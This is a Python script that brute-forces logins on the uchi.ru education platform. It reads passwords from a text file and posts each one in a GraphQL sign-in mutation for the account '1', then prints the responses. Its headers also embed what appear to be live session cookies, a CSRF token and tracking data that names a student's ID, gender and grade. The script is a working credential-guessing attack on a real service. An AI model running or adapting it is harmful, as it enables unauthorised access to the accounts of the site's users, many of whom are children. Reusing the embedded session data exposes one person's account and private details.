import requests


url = "https://uchi.ru/teens/gateway"  # URL для отправки запроса

def get_pass():
    with open("test.txt", "r", encoding="UTF-8") as txt:
        return txt.read().split()

def get_data(login, password):
    data = {
        "operationName": "MainPage_SignIn",
        "query": """
            mutation MainPage_SignIn(
                $login: String!
                $password: String!
                $remember: Boolean
                $nextPath: String
                $onlineLesson: String
                $headmasterInviteToken: String
            ) {
                signIn(
                    input: {
                        params: {
                            login: $login
                            password: $password
                            remember: $remember
                            nextPath: $nextPath
                            onlineLesson: $onlineLesson
                            headmasterInviteToken: $headmasterInviteToken
                        }
                    }
                ) {
                    payload {
                        success
                        nextPath
                        record {
                            foreignId
                            __typename
                        }
                    }
                }
            }
        """,
        "variables": {
            "login": login,
            "password": password,
            "remember": False
        }
    }
    return data

# Заголовки запроса
headers = {
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-length": "744",
    "content-type": "application/json",
    "cookie": "GuestUUID=5bf0dbad-0970-409a-84e8-6d0cf7b457ed; spid=1739375649614_8e1b125c5c1105afb18d64428467097b_rfb6gi5tig6tx9o7; _reset_session=1; region_id=; ab_test_smart_captcha_parent_reg=; _gid=GA1.2.1301420709.1739375735; _ym_uid=1739377806460703952; _ym_d=1739377806; _hjSessionUser_3227316=eyJpZCI6IjI1ZGEyZjgxLTIyODgtNTM3OS05ZWIwLTNmNDkzN2YwNDg1YSIsImNyZWF0ZWQiOjE3MzkzNzc4MDY0NjUsImV4aXN0aW5nIjp0cnVlfQ==; _ym_isad=1; gtmAuthorisationStatus=true; gtmLastUserType=student; gtmLastStudentData={\"uid\":\"87417046\",\"user_type\":\"student\",\"gender\":\"male\",\"level\":\"6\",\"registration_time\":\"2023-11-13T15:22:00.996Z\",\"registration_type\":\"teacher\",\"last_guest_uuid\":\"5bf0dbad-0970-409a-84e8-6d0cf7b457ed\"}; _hjSessionUser_1324055=eyJpZCI6IjdmZjc0NWExLWUzYWEtNTAxYy1hNWM2LTkxMWNlNDM0MjY1ZSIsImNyZWF0ZWQiOjE3MzkzNzc4NjI3MDAsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.1.1975339922.1739375735; uxs_uid=9c9b7260-e960-11ef-a6ab-813a055d9afd; activate_hotjar=true; activate_fullstory=false; amplitude_id_9f216c1c238ac76db80eb74b5e5eb247_teacher_lkuchi.ru=eyJkZXZpY2VJZCI6ImQxNDI5ZDgyLTNiYjAtNGQ3Zi05ZjQwLTE1ZDFkMTIyNGI3OVIiLCJ1c2VySWQiOiI4NzQxNzA0NiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTczOTM3NzUyMzYzNSwibGFzdEV2ZW50VGltZSI6MTczOTM3ODg0NTk0MSwiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; mindboxDeviceUUID=64d91fff-be6f-4f70-8b73-b73568e62acf; directCrm-session=%7B%22deviceGuid%22%3A%2264d91fff-be6f-4f70-8b73-b73568e62acf%22%7D; p-100739740-current_child=87417046; gtmForceFetch=true; _ga_M5XG8KPGES=GS1.1.1739383608.1.1.1739383670.0.0.0; _hjSession_3227316=eyJpZCI6ImE0MDFkZjBiLWQ4MjUtNDQ2Ni04NDYzLTgyNDAyNDVlZjRhZSIsImMiOjE3Mzk0Mjk5MDQwNjEsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _ym_visorc=b; _hjSession_1324055=eyJpZCI6ImQ0YTI2MzhlLWQ2MTktNGIyYS1iNDYyLWJiZTQ1ZWM4MmJlNSIsImMiOjE3Mzk0Mjk5MTgwNTIsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; _ga_XCTPBET4Z3=GS1.1.1739431327.1.0.1739431327.0.0.0; CSRF-TOKEN=rm4ZKy%2FoPD9yinqpASTP6xDHo%2BI4fWxINpJY5LT42i5DM7y%2BEmfhDlifD437T6%2BjydBgKtdAkOFmy8xO9%2FQ5dg%3D%3D; spsc=1739431337768_c311a61ed46bbdd3f3f80fd248242a3f_e6cfb3ea8f0a0fa28cc6ebefdcae8ea5; _uchiru_login_session=U215cUIrYXY1S0Nna1hKb3RNc2pzMlNEWENRVUtXQ3RaZkQ4czNBUmFINmYzeVdzdkhkb3RSdW80a2U0RHkrbmVjMWdDNWszcDBWU1huK0VBMnBtRnRnMW5vTWRuQU5WUlVGRm4wVS9OS3F2eEJzV1pNeW8rNHVxWGpDbU11azRTbU1XWlhDMGZHME9teWw2UVFmY0w0WUZkOUtucWE2SmdoS25CZG4ydWNTWjlkbld3elZCYU5RWU9CeHNabTN0LS1CdEZkc3J4WlNRcGJWT29weGIwYVRBPT0%3D--af356b1b8fbcd12f7f538ba73a64352a5148f4f1; GuestID=be88b810-0216-4ffb-9dae-59f0151e48e3; _ga_65WVQEWY3D=GS1.1.1739429905.4.1.1739431339.0.0.0; _ga_2FXYEZB9GP=GS1.1.1739429905.4.1.1739431339.0.0.0; _ga_TQMGHN9MDC=GS1.1.1739430178.2.1.1739431354.0.0.0",
    "origin": "https://uchi.ru",
    "priority": "u=1, i",
    "referer": "https://uchi.ru/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.266 Safari/537.36"
}

for password in get_pass():
    response = requests.post(url, json=get_data("1", password), headers=headers)
    print("Response JSON:", response.json())
